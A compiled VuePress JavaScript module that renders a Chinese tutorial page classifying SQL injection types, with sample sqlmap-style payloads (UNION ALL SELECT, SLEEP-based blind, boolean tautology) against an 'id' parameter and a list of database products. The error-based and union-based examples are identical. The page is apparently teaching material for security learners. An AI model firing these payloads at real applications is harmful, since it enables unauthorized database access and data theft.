import{_ as l,K as a,L as d,a5 as n,W as i,F as s}from"./framework-edebdfe1.js";const r={},c=i('<h1 id="注入类型" tabindex="-1"><a class="header-anchor" href="#注入类型" aria-hidden="true">#</a> 注入类型</h1><div class="hint-container warning"><p class="hint-container-title">DeeLMind 推荐</p><p>分类只是便于新手学习，学到最后应该九九归一，无所谓什么类型</p></div><h2 id="注入类型分类" tabindex="-1"><a class="header-anchor" href="#注入类型分类" aria-hidden="true">#</a> 注入类型分类</h2>',3),o=i(`<ul><li>In-band SQLi (Classic SQLi)</li></ul><div class="language-SQL line-numbers-mode" data-ext="SQL"><pre class="language-SQL"><code>id=4&#39; AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178787671,(SELECT (ELT(2556=2556,1))),0x71627a6a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND &#39;JOtO&#39;=&#39;JOtO
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>Error-based SQLi</li></ul><div class="language-SQL line-numbers-mode" data-ext="SQL"><pre class="language-SQL"><code>id=-7810&#39; UNION ALL SELECT NULL,CONCAT(0x7171627a71,0x415449484d526167596a77484c6e47775644794b4b7048756b6b47746472536a4c58694471634d65,0x7171787171),NULL--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>Union-based SQLi</li></ul><div class="language-SQL line-numbers-mode" data-ext="SQL"><pre class="language-SQL"><code>id=-7810&#39; UNION ALL SELECT NULL,CONCAT(0x7171627a71,0x415449484d526167596a77484c6e47775644794b4b7048756b6b47746472536a4c58694471634d65,0x7171787171),NULL--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>Time-based Blind SQLi</li></ul><div class="language-SQL line-numbers-mode" data-ext="SQL"><pre class="language-SQL"><code>id=4&#39; AND (SELECT 5114 FROM (SELECT(SLEEP(2))) AS RezN) AND &#39;vULj&#39;=&#39;vULj
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>Boolean-based Blind SQLi</li></ul><div class="language-SQL line-numbers-mode" data-ext="SQL"><pre class="language-SQL"><code>id=1&#39; AND 5957=5957 AND &#39;DFUZ&#39;=&#39;DFUZ
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li>Stacked injections</li></ul><div class="language-SQL line-numbers-mode" data-ext="SQL"><pre class="language-SQL"><code>;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><ul><li><p>OOB(Out Of Band)</p></li><li><p>二次注入</p></li></ul><h2 id="数据库分类" tabindex="-1"><a class="header-anchor" href="#数据库分类" aria-hidden="true">#</a> 数据库分类</h2><ul><li>DB2</li><li>MySQL</li><li>MongoDB</li><li>Redis</li><li>Oracle</li><li>PostgreSQL</li><li>Microsoft SQL Server</li><li>SQLite</li><li>Cassandra</li><li>CouchDB</li><li>Amazon Aurora</li><li>Google Cloud Spanner</li><li>Firebase Realtime Database</li><li>Apache HBase</li><li>MariaDB</li><li>Amazon DynamoDB</li><li>Apache Cassandra</li><li>Apache Hive</li><li>Apache Phoenix</li><li>Apache Spark SQL</li><li>Apache Derby</li><li>ArangoDB</li><li>CockroachDB</li><li>Couchbase</li><li>Elasticsearch</li><li>InfluxDB</li><li>Neo4j</li><li>OrientDB</li><li>RavenDB</li><li>Riak</li><li>TimescaleDB</li></ul>`,15);function t(u,L){const e=s("DocsAD");return a(),d("div",null,[c,n(e),o])}const S=l(r,[["render",t],["__file","type.html.vue"]]);export{S as default};
